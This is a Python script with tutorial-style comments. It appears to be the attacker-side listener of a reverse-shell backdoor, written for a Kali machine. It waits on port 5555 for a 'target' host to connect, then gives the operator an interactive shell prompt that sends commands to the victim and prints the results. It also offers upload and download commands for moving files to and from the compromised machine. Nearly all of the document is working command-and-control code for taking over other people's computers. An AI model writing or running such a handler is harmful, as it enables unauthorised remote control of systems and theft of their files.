#First we start off by importing the libraries that we will need (socket, json, os)
#Socket is basically communication between two endpoints (server and target)
#A format (standarized) used to transfer data as text that can be seen over a network
#Provides the facility to establish the interaction between the user and the operating system

#This is still a work in progress and will try to update more notes when I get a chance

import socket
import json
import os

def reliable_send(data):
        jsondata = json.dumps(data)
        target.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
           try:
              data = data + target.recv(1024).decode().rstrip()
              return json.loads(data)
           except ValueError:
              continue

def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())

def download_file(file_name):
   f = open(file_name, 'wb')
   target.settimeout(1)
   chunk = target.recv(1024)
   while chunk:
      f.write(chunk)
      try:
         chunk = target.recv(1024)
      except socket.timeout as e:
         break
   target.settimeout(None)
   f.close()
 
def target_communication():
   while True:
      command = input('* Shell~%s: ' % str(ip))
      reliable_send(command)
      if command == 'quit':
         break
      elif command == 'clear':
         os.system('clear')
      elif command[:3] == 'cd ':
         pass
      elif command[:8] == 'download':
         download_file(command[9:])
      elif command[:6] == 'upload':
                   upload_file(command[7:])
      else:
         result = reliable_recv()
         print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.236', 5555)) #Make sure you put in your IP address for your Kali machine
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()



